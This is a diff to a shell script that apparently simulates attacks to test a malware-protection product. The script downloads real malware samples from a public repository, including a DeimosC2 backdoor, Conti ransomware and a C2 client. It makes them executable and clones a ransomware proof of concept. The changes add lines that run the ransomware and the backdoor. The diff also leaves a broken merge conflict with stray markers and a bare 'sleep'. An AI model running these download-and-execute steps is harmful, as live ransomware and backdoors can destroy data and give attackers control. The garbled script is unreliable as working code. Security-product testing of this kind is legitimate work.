@@ -42,7 +42,7 @@ echo "Scenario 2 - Malware Protection - Wildfire Analysis"
 
 echo "[+] Downloading Unix backdoor script"
 wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
-chmod 700 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
+chmod +x 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 sleep 3
 
 echo "[+] Creating copies in suspicious places"
@@ -62,7 +62,7 @@ wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/mai
 sleep 3
 
 echo "[+] Making Conti ransomware executable"
-chmod 700 conti.sh
+chmod +x conti.sh
 sleep 3
 
 echo "[+] Downloading C2 client"
@@ -71,18 +71,11 @@ sleep 3
 
 echo "[+] Changing C2 Client file permissions to executable" 
 chmod +x c2.sh
-<<<<<<< Updated upstream
 sleep 3
 
 ## RANSOMWARE POC 
-=======
 sleep 
 
-# Exectuion of Malware and Handlening 
-echo "[+] callin malware executables"
-05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
-conti.sh || true 
-c2.sh || true 
 
 >>>>>>> Stashed changes
 git clone https://github.com/jimmy-ly00/Ransomware-PoC
@@ -287,7 +280,8 @@ nmap -iL url2.txt
 echo "[+] Calling malware executables"
 #[TODO] Error handeling in this - nil pointer reference in go library 
 #./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
-#./conti.sh || true 
+sh conti.sh || true 
+05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 #./c2.sh || true 
 
 
